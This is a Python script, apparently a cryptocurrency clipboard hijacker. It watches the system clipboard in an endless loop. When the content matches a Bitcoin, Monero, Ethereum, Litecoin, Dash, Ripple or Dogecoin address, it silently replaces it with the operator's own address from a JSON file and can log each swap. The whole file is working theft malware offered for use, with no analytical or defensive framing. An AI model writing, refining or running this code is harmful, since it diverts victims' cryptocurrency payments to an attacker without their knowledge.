import pyperclip
import re
import argparse
import json
import time
import sys
import pprint
from datetime import datetime

parser = argparse.ArgumentParser(
    description="Replace crypto addresses in clipboard with your own"
)
parser.add_argument("--verbose", help="Get more details", action="store_true")
parser.add_argument("--log", help="Logs output to log.txt", action="store_true")
# parser.add_argument("--log", help="Log actions to log.txt", action="store_true")
args = parser.parse_args()

with open("addresses.json") as f:
    addresses = json.load(f)
    if addresses["legacy_btc"] == "NULL" and addresses["segwit_btc"] == "NULL":
        print("BTC address can't be set to null!")
        sys.exit()
    elif addresses["legacy_btc"] == "NULL" or addresses["segwit_btc"] == "NULL":
        print("BTC address can't be set to null!")
        sys.exit()

with open("addresses.json") as f:
    loaded_addresses = json.load(f)
if args.verbose:
    print(f"Loaded in the following (IGNORING NULL): ")
    pprint.pprint(loaded_addresses)


def parse_clip(clipboard):
    global loaded_addresses
    cryptos = {
        "legacy_btc": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "segwit_btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "eth": "^0x[a-fA-F0-9]{40}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "ripple": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
    }
    if len(clipboard) >= 100:
        # Clipboard is too long... doing nothing
        return False

    for k, v in cryptos.items():
        if bool(re.search(v, clipboard)) and loaded_addresses[k] != "NULL":
            if args.verbose:
                print(f"Found {k}")
            return k
    return False


def replace_clip(clipboard, crypto):
    global loaded_addresses
    if loaded_addresses[crypto] != "NULL":
        clipboard = loaded_addresses[crypto]
    return clipboard


def log(clipboard, replace, time):
    with open("log.txt", "a+") as log:
        log.write("(" + time + ") " + clipboard + "-> " + replace + "\n")


def main():
    now = datetime.now()
    current_time = now.strftime("%d/%m/%Y %I:%M %p")
    global loaded_addresses
    current_clipboard = pyperclip.paste()
    crypto_found = parse_clip(current_clipboard)
    if crypto_found != False:
        # if there is a crypto found replace else return original
        replacement = replace_clip(current_clipboard, crypto_found)
        if args.verbose:
            print(f"{pyperclip.paste()} -> {replacement}")
        if args.log:
            log(pyperclip.paste(), replacement, current_time)
        pyperclip.copy(replacement)
    else:
        pyperclip.copy(current_clipboard)


while True:
    time.sleep(0.4)
    main()
